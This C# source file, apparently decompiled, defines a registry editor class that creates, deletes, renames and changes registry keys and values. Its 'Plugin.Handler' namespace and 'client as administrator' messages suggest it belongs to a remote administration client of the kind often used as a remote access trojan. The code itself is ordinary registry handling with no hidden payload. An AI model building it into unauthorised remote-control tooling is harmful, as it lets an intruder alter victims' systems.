using System;
using Microsoft.Win32;

namespace Plugin.Handler;

public class RegistryEditor
{
	private const string REGISTRY_KEY_CREATE_ERROR = "Cannot create key: Error writing to the registry";

	private const string REGISTRY_KEY_DELETE_ERROR = "Cannot delete key: Error writing to the registry";

	private const string REGISTRY_KEY_RENAME_ERROR = "Cannot rename key: Error writing to the registry";

	private const string REGISTRY_VALUE_CREATE_ERROR = "Cannot create value: Error writing to the registry";

	private const string REGISTRY_VALUE_DELETE_ERROR = "Cannot delete value: Error writing to the registry";

	private const string REGISTRY_VALUE_RENAME_ERROR = "Cannot rename value: Error writing to the registry";

	private const string REGISTRY_VALUE_CHANGE_ERROR = "Cannot change value: Error writing to the registry";

	public static bool CreateRegistryKey(string parentPath, out string name, out string errorMsg)
	{
		name = "";
		try
		{
			RegistryKey writableRegistryKey = GetWritableRegistryKey(parentPath);
			if (writableRegistryKey == null)
			{
				errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
				return false;
			}
			int num = 1;
			string text = $"New Key #{num}";
			while (writableRegistryKey.ContainsSubKey(text))
			{
				num++;
				text = $"New Key #{num}";
			}
			name = text;
			using (RegistryKey registryKey = writableRegistryKey.CreateSubKeySafe(name))
			{
				if (registryKey == null)
				{
					errorMsg = "Cannot create key: Error writing to the registry";
					return false;
				}
			}
			errorMsg = "";
			return true;
		}
		catch (Exception ex)
		{
			errorMsg = ex.Message;
			return false;
		}
	}

	public static bool DeleteRegistryKey(string name, string parentPath, out string errorMsg)
	{
		try
		{
			RegistryKey writableRegistryKey = GetWritableRegistryKey(parentPath);
			if (writableRegistryKey == null)
			{
				errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
				return false;
			}
			if (!writableRegistryKey.ContainsSubKey(name))
			{
				errorMsg = "The registry: " + name + " does not exist in: " + parentPath;
				return true;
			}
			if (!writableRegistryKey.DeleteSubKeyTreeSafe(name))
			{
				errorMsg = "Cannot delete key: Error writing to the registry";
				return false;
			}
			errorMsg = "";
			return true;
		}
		catch (Exception ex)
		{
			errorMsg = ex.Message;
			return false;
		}
	}

	public static bool RenameRegistryKey(string oldName, string newName, string parentPath, out string errorMsg)
	{
		try
		{
			RegistryKey writableRegistryKey = GetWritableRegistryKey(parentPath);
			if (writableRegistryKey == null)
			{
				errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
				return false;
			}
			if (!writableRegistryKey.ContainsSubKey(oldName))
			{
				errorMsg = "The registry: " + oldName + " does not exist in: " + parentPath;
				return false;
			}
			if (!writableRegistryKey.RenameSubKeySafe(oldName, newName))
			{
				errorMsg = "Cannot rename key: Error writing to the registry";
				return false;
			}
			errorMsg = "";
			return true;
		}
		catch (Exception ex)
		{
			errorMsg = ex.Message;
			return false;
		}
	}

	public static bool CreateRegistryValue(string keyPath, RegistryValueKind kind, out string name, out string errorMsg)
	{
		name = "";
		try
		{
			RegistryKey writableRegistryKey = GetWritableRegistryKey(keyPath);
			if (writableRegistryKey == null)
			{
				errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
				return false;
			}
			int num = 1;
			string text = $"New Value #{num}";
			while (writableRegistryKey.ContainsValue(text))
			{
				num++;
				text = $"New Value #{num}";
			}
			name = text;
			if (!writableRegistryKey.SetValueSafe(name, kind.GetDefault(), kind))
			{
				errorMsg = "Cannot create value: Error writing to the registry";
				return false;
			}
			errorMsg = "";
			return true;
		}
		catch (Exception ex)
		{
			errorMsg = ex.Message;
			return false;
		}
	}

	public static bool DeleteRegistryValue(string keyPath, string name, out string errorMsg)
	{
		try
		{
			RegistryKey writableRegistryKey = GetWritableRegistryKey(keyPath);
			if (writableRegistryKey == null)
			{
				errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
				return false;
			}
			if (!writableRegistryKey.ContainsValue(name))
			{
				errorMsg = "The value: " + name + " does not exist in: " + keyPath;
				return true;
			}
			if (!writableRegistryKey.DeleteValueSafe(name))
			{
				errorMsg = "Cannot delete value: Error writing to the registry";
				return false;
			}
			errorMsg = "";
			return true;
		}
		catch (Exception ex)
		{
			errorMsg = ex.Message;
			return false;
		}
	}

	public static bool RenameRegistryValue(string oldName, string newName, string keyPath, out string errorMsg)
	{
		try
		{
			RegistryKey writableRegistryKey = GetWritableRegistryKey(keyPath);
			if (writableRegistryKey == null)
			{
				errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
				return false;
			}
			if (!writableRegistryKey.ContainsValue(oldName))
			{
				errorMsg = "The value: " + oldName + " does not exist in: " + keyPath;
				return false;
			}
			if (!writableRegistryKey.RenameValueSafe(oldName, newName))
			{
				errorMsg = "Cannot rename value: Error writing to the registry";
				return false;
			}
			errorMsg = "";
			return true;
		}
		catch (Exception ex)
		{
			errorMsg = ex.Message;
			return false;
		}
	}

	public static bool ChangeRegistryValue(RegistrySeeker.RegValueData value, string keyPath, out string errorMsg)
	{
		try
		{
			RegistryKey writableRegistryKey = GetWritableRegistryKey(keyPath);
			if (writableRegistryKey == null)
			{
				errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
				return false;
			}
			if (!RegistryKeyHelper.IsDefaultValue(value.Name) && !writableRegistryKey.ContainsValue(value.Name))
			{
				errorMsg = "The value: " + value.Name + " does not exist in: " + keyPath;
				return false;
			}
			if (!writableRegistryKey.SetValueSafe(value.Name, value.Data, value.Kind))
			{
				errorMsg = "Cannot change value: Error writing to the registry";
				return false;
			}
			errorMsg = "";
			return true;
		}
		catch (Exception ex)
		{
			errorMsg = ex.Message;
			return false;
		}
	}

	public static RegistryKey GetWritableRegistryKey(string keyPath)
	{
		RegistryKey registryKey = RegistrySeeker.GetRootKey(keyPath);
		if (registryKey != null && registryKey.Name != keyPath)
		{
			string name = keyPath.Substring(registryKey.Name.Length + 1);
			registryKey = registryKey.OpenWritableSubKeySafe(name);
		}
		return registryKey;
	}
}
